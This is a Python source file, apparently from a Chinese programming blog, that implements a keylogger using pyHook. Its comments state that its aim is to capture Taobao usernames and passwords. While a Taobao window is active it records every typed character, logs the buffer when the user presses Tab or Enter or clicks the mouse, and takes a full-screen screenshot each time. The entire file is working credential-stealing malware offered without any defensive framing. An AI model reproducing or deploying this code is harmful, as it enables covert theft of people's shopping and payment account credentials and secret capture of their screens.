# -*- coding: utf-8 -*-
import pythoncom
import pyHook
import time
import logging
import logging.config
from PIL import ImageGrab

#日志配置文件名
LOG_FILENAME = 'hook_logging.conf'

#日志语句提示信息
LOG_CONTENT_NAME = 'taobao_input_msg'

def log_init(log_config_filename, logname):
    '''''
    Function:日志模块初始化函数
    Input：log_config_filename:日志配置文件名
           lognmae:每条日志前的提示语句
    Output: logger
    author: socrates
    blog:http://blog.csdn.net/dyx1024
    date:2012-02-13
    '''
    logging.config.fileConfig(log_config_filename)
    logger = logging.getLogger(logname)
    return logger


def onMouseEvent(event):
    '''''
    Function:处理鼠标左键单击事件，如果当前MSG中存放了信息，
                                 将其写入文件，因为有的用户在输入 完用户名后，不是使用TAB键切换到密码
                                 框,而是通过鼠标切换到密码输入窗口这种情况应该属于大多数网民的习惯，
                                 所以此处要判断是否通过鼠标切换了输入窗口
    Input：even
    Output: Ture
    author: socrates
    blog:http://blog.csdn.net/dyx1024
    date:2012-03-03
    '''
    global MSG
    if len(MSG) != 0:
        hook_logger.info('current page:%s' % event.WindowName)
        hook_logger.error('information:%s' % MSG)
        MSG = ''
        #屏幕抓图实现
        pic_name = time.strftime('%Y%m%d%H%M%S',time.localtime(time.time()))
        pic = ImageGrab.grab()
        pic.save('%s.png' % pic_name)
        #保存成为以日期命名的图片
    return True


def onKeyboardEvent(event):
    "处理键盘事件"
    '''''
    Function:处理键盘事件，如果当前窗口为TAOBAO页面，刚开始监控并记录用户输入
                                   因为此时用户可能准备输入用户名及密码进行登陆，所以将用户输入的所有可见
                                 的ascii字符记录下来，此处要考虑用户是否使用了TAB键或回车键来
                                结束输入，此时要将信息记录到日志中。
    Input：even
    Output: Ture
    author: socrates
    blog:http://blog.csdn.net/dyx1024
    date:2012-03-03
    '''
    global MSG
    if event.WindowName.decode('GBK').find(u"淘宝") != -1:
        if (127 >= event.Ascii > 31) or (event.Ascii == 8):
            MSG += chr(event.Ascii)
            hook_logger.info('ascii:%d(%s)' % (event.Ascii, str(event.Key)))
        if (event.Ascii == 9) or (event.Ascii == 13):
            hook_logger.info('current page:%s' % event.WindowName)
            hook_logger.error('information:%s' % MSG)
            MSG = ''
            #屏幕抓图实现
            pic_name = time.strftime('%Y%m%d%H%M%S',time.localtime(time.time()))
            pic = ImageGrab.grab()
            #保存成为以日期命名的图片
            pic.save('%s.png' % pic_name)

    return True


if __name__ == "__main__":
    '''''
    Function:获取TAOBAO账号及密码，增加抓图功能
    Input：NONE
    Output: NONE
    author: socrates
    blog:http://blog.csdn.net/dyx1024
    date:2012-03-03
    '''

    #打开日志文件
    #初始化日志系统
    hook_logger = log_init(LOG_FILENAME, LOG_CONTENT_NAME)

    MSG = ''

    #创建hook句柄
    hm = pyHook.HookManager()

    #监控鼠标
    hm.SubscribeMouseLeftDown(onMouseEvent)
    hm.HookMouse()

    #监控键盘
    hm.KeyDown = onKeyboardEvent
    hm.HookKeyboard()

    #循环获取消息
    pythoncom.PumpMessages()